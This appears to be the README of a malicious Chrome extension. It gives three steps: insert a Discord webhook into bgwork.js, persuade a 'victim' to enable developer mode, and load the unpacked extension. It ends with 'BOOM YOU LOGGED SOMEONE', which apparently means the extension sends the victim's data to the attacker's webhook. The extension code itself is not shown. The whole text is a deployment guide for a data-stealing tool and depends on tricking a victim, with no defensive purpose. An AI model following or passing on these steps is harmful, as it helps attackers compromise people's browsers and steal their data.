FIRST STEP go to bgwork.js and change where it says, "Discord WEBHOOK GOES HERE" to your webhook.![webhook](https://user-images.githubusercontent.com/105136784/209619134-22a90cca-9e8d-4732-b3c9-119cf67e9e1a.PNG)


SECOND STEP tell your victim to go to chrome://extensions/ AND ENABLE DEVELOPER MODE ON THE TOP RIGHT
![dev](https://user-images.githubusercontent.com/105136784/209619387-cde85a4d-12d4-4803-bcc5-d87dd615f0c1.PNG)


NEXT STEP IS PRESS "Load unpacked" AND BOOM YOU LOGGED SOMEONE.

![load](https://user-images.githubusercontent.com/105136784/209618915-50bb5464-7924-45ab-8f7e-9bce2da0f2a0.PNG)
 
